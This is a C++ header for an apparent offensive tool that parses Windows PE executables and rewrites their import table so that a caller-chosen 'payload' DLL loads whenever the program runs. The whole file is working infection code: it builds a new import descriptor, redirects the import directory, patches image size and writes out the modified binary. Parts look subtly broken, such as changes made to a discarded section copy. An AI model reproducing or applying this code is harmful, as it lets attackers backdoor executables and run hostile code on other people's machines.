#pragma once

#include <cstdint>
#include <list>
#include <string>
#include <fstream>
#include <iostream>
#include <memory>
#include "shared.h"

class PESectionParameters {
public:
  static constexpr int SECTION_DESCRIPTOR_SIZE = 40;

  std::string name;
  uint32_t virtualAddress;
  uint32_t virtualSize;
  uint32_t rawDataAddress;
  uint32_t rawDataSize;
  uint32_t characteristics;

  PESectionParameters(char* sectionAddress)
  {
    name = std::string(sectionAddress, 8);
    virtualSize = *reinterpret_cast<uint32_t*>(sectionAddress + 8);
    virtualAddress = *reinterpret_cast<uint32_t*>(sectionAddress + 12);
    rawDataSize = *reinterpret_cast<uint32_t*>(sectionAddress + 16);
    rawDataAddress = *reinterpret_cast<uint32_t*>(sectionAddress + 20);
    characteristics = *reinterpret_cast<uint32_t*>(sectionAddress + 36);
  }
};

class PEFile {
public:
  PEFile(const char* filename)
  {
    std::ifstream file;
    file.open(filename, std::ios::binary);

    fileSize_ = std::filesystem::file_size(filename);
    data_ = new char[fileSize_];
    dataSize_ = fileSize_;
    file.read(data_, fileSize_);

    if ((data_[0] == 0x4d && data_[1] == 0x5a) ||
        (data_[0] == 0x5a && data_[1] == 0x4d))
    {
      headerOffset_ = *reinterpret_cast<int32_t*>(data_ + 60);
      if (data_[headerOffset_] == 0x50 && data_[headerOffset_ + 1] == 0x45)
      {
        constexpr int MACHINE_OFFSET = 4;
        uint16_t machine = *reinterpret_cast<uint16_t*>(
          &data_[headerOffset_ + MACHINE_OFFSET]);
        if (machine == 0x014c)
        {
          std::cout << '\t' << __c(42, "[+]") <<
                       "\tMachine: pe32" << std::endl;
          is64_ = false;
        }
        else if (machine == 0x8664)
        {
          std::cout << '\t' << __c(42, "[+]") <<
                       "\tMachine: pe64" << std::endl;
          is64_ = true;
        }
        else
        {
         throw std::runtime_error("Unknown machine value");
        }

        constexpr int SECTION_NUM_OFFSET = MACHINE_OFFSET + 2;
        uint16_t numSections = *reinterpret_cast<uint16_t*>(
          &data_[headerOffset_ + SECTION_NUM_OFFSET]);
        std::cout << '\t' << __c(42, "[+]") <<
                     "\tNumber of sections: " <<
                     numSections << std::endl;

        constexpr int OPT_HEADER_SIZE_OFFSET = SECTION_NUM_OFFSET + 14;
        uint16_t optHeaderSize = *reinterpret_cast<uint16_t*>(
          &data_[headerOffset_ + OPT_HEADER_SIZE_OFFSET]);
        std::cout << '\t' << __c(42, "[+]") <<
                     "\tSize of optional header: " <<
                     optHeaderSize << std::endl;

        constexpr int OPT_HEADER_OFFSET = OPT_HEADER_SIZE_OFFSET + 4;
        uint16_t optHeaderMagic= *reinterpret_cast<uint16_t*>(
          &data_[headerOffset_ + OPT_HEADER_OFFSET]);
        bool isMagic64;
        if (optHeaderMagic == 0x010b)
        {
          std::cout << '\t' << __c(42, "[+]") <<
                       "\tOptional header magic: 32bit" << std::endl;
          isMagic64 = false;
        }
        else if (optHeaderMagic == 0x020b)
        {
          std::cout << '\t' << __c(42, "[+]") <<
                       "\tOptional header magic: 64bit" << std::endl;
          isMagic64 = true;
        }
        else
        {
          throw std::runtime_error("Unsupported optional header magic value");
        }
        if (is64_ != isMagic64)
        {
          throw std::runtime_error("Optional header magic"
                                   "does not match machine");
        }

        constexpr int DATADIR_COUNT = 16;
        constexpr int DATADIR_SIZE = 8;
        int dataDirsOffset = OPT_HEADER_OFFSET + optHeaderSize -
                             DATADIR_COUNT * DATADIR_SIZE;
        importDataDirRVAOffset_ = dataDirsOffset + 8;
        uint32_t importDataDirRVA = *reinterpret_cast<uint32_t*>(
          &data_[headerOffset_ + importDataDirRVAOffset_]);
        importDataDirSizeOffset_ = importDataDirRVAOffset_ + 4;
        uint32_t importDataDirSize = *reinterpret_cast<uint32_t*>(
          &data_[headerOffset_ + importDataDirSizeOffset_]);

        sectionsOffset_ = OPT_HEADER_OFFSET + optHeaderSize;
        int32_t index = sectionsOffset_;
        for (uint16_t i = 0; i < numSections; ++i)
        {
          PESectionParameters section(&data_[headerOffset_ + index]);
          index += PESectionParameters::SECTION_DESCRIPTOR_SIZE;
          sectionsParams_.push_back(section);
          std::cout << '\t' << __c(42, "[+]") <<
                       "\tFound section: " <<
                       section.name << std::endl;
        }

        bool foundImportSection = false;
        for (auto section = sectionsParams_.cbegin();
             section != sectionsParams_.cend(); ++section)
        {
          if (section->virtualAddress <= importDataDirRVA &&
              section->virtualAddress + section->rawDataSize >=
              importDataDirRVA + importDataDirSize)
          {
            uint32_t importDataDirOffset = importDataDirRVA -
                                           section->virtualAddress +
                                           section->rawDataAddress;
            importData_ = new char[importDataDirSize];
            importDataSize_ = importDataDirSize;
            if (memcpy_s(importData_, importDataDirSize, data_ +
              importDataDirOffset, importDataDirSize) != 0)
            {
              throw std::runtime_error("Memory copying issue");
            }

            std::cout << '\t' << __c(42, "[+]") <<
                         "\tImport found at section: " <<
                         section->name << std::endl;
            foundImportSection = true;
            break;
          }
        }
        if (!foundImportSection)
        {
          throw std::runtime_error("Unable to find import section");
        }
        return;
      }
    }
    throw std::runtime_error("Unable to read PE file");
  }

  ~PEFile()
  {
    if (data_ != nullptr)
    {
      delete data_;
    }
    if (importData_ != nullptr)
    {
      delete importData_;
    }
  }

  void
  CreateNewImport(std::string payloadDll, std::string dummyFunc)
  {
    uint32_t offset = Align_(static_cast<uint32_t>(fileSize_), 0x1000);
    uint32_t size = CalculateNewImportSize_(payloadDll, dummyFunc);
    std::unique_ptr<char[]> buff(new char[size]);
    uint32_t baseAddress = sectionsParams_.back().virtualAddress + offset;

    uint32_t n = 0;
    memcpy_s(&buff[n], size - n, importData_, importDataSize_ - 20);
    n += static_cast<uint32_t>(importDataSize_ - 20);
    uint32_t v = static_cast<uint32_t>(
      baseAddress + importDataSize_ + 40 +
      payloadDll.length() + dummyFunc.length());
    memcpy_s(&buff[n], size - n, &v, 4);
    n += 4;
    memset(&buff[n], '\0', 8);
    n += 8;
    v = static_cast<uint32_t>(baseAddress + importDataSize_ + 20);
    memcpy_s(&buff[n], size - n, &v, 4);
    n += 4;
    v = static_cast<uint32_t>(
      baseAddress + importDataSize_ + 24 +
      payloadDll.length() + dummyFunc.length());
    memcpy_s(&buff[n], size - n, &v, 4);
    n += 4;
    memset(&buff[n], '\0', 20);
    n += 20;
    memcpy_s(&buff[n], size - n, payloadDll.c_str(), payloadDll.length() + 1);
    n += static_cast<uint32_t>(payloadDll.length() + 1);
    memset(&buff[n], '\0', 2);
    n += 2;
    memcpy_s(&buff[n], size - n, dummyFunc.c_str(), dummyFunc.length() + 1);
    n += static_cast<uint32_t>(dummyFunc.length() + 1);
    v = static_cast<uint32_t>(
      baseAddress + importDataSize_ + 21 + payloadDll.length());
    memcpy_s(&buff[n], size - n, &v, 4);
    n += 4;
    memset(&buff[n], '\0', 12);
    n += 12;
    v = static_cast<uint32_t>(
      baseAddress + importDataSize_ + 21 + payloadDll.length());
    memcpy_s(&buff[n], size - n, &v, 4);
    n += 4;
    memset(&buff[n], '\0', 12);
    n += 12;

    uint32_t beginSize = sectionsParams_.back().rawDataAddress +
                         static_cast<uint32_t>(fileSize_);
    uint32_t beginAlign = sectionsParams_.back().rawDataAddress +
                          Align_(static_cast<uint32_t>(fileSize_), 0x1000);
    uint32_t endAlign = Align_(n, 0x200);

    uint32_t newDataSize = beginAlign + endAlign;
    char* newData = new char[newDataSize];
    memcpy_s(newData, newDataSize, data_, beginSize);
    memcpy_s(newData + beginAlign, newDataSize - beginAlign, &buff[0], n);

    delete data_;
    data_ = newData;
    dataSize_ = newDataSize;
    std::cout << '\t' << __c(42, "[+]") <<
                 "\tNew file size: " << dataSize_ << std::endl;

    //memcpy_s(data_, 4, &baseAddress, 4);
    memcpy_s(&data_[headerOffset_ + importDataDirRVAOffset_],
             4, &beginAlign, 4);
    uint32_t newImportSize = *reinterpret_cast<uint32_t*>(
      &data_[headerOffset_ + importDataDirSizeOffset_]);
    newImportSize += 0x14;
    memcpy_s(&data_[headerOffset_ + importDataDirSizeOffset_],
             4, &newImportSize, 4);
    FixSizeOfImage_();

    // ---------------------
    auto sectParams = sectionsParams_.back();
    //uint32_t originalSize = sectParams.rawDataSize;
    //uint32_t newImportSize = CalculateNewImportSize_(payloadDll, dummyFunc);
    sectParams.characteristics |= 0xC0000000;
    uint32_t addSize = Align_(sectParams.rawDataSize, 0x1000) +
                       Align_(size, 0x200) - sectParams.rawDataSize;
    sectParams.virtualSize += addSize;
    sectParams.virtualAddress += addSize;
  }

  void Save(const char* filename)
  {
    /*std::string outPath = filename;
    auto dirPath = outPath.substr(0, outPath.find_last_of('/'));
    if (!dirPath.empty())
    {
      std::filesystem::create_directory(&dirPath.front());
    }*/

    std::ofstream ofile;
    ofile.open(filename, std::ios::binary);
    ofile.write(data_, static_cast<uint32_t>(dataSize_));
  }

private:
  uintmax_t fileSize_;
  char*   data_;
  size_t  dataSize_;
  char*   importData_;
  size_t  importDataSize_;
  bool    is64_;
  int32_t headerOffset_;
  int32_t sectionsOffset_;
  int32_t importDataDirRVAOffset_;
  int32_t importDataDirSizeOffset_;

  std::list<PESectionParameters> sectionsParams_;

  void FixSizeOfImage_()
  {
    uint32_t size = sectionsParams_.back().virtualSize +
                    sectionsParams_.back().virtualAddress;
    if (size % 0x1000 != 0)
    {
      size = ((size / 0x1000) + 1) * 0x1000;
    }
    *reinterpret_cast<uint32_t*>(&data_[headerOffset_ + 80]) = size;
    std::cout << '\t' << __c(42, "[+]") <<
                 "\tFixed size of image" << std::endl;
  }

  uint32_t CalculateNewImportSize_(std::string payloadDll, std::string dummyFunc)
  {
    return static_cast<uint32_t>(
      importDataSize_ + 56 + payloadDll.length() + dummyFunc.length());
  }

  uint32_t Align_(uint32_t length, uint32_t value)
  {
    uint32_t n = 0;
    while (n < length)
    {
      n += value;
    }
    return n;
  }
};
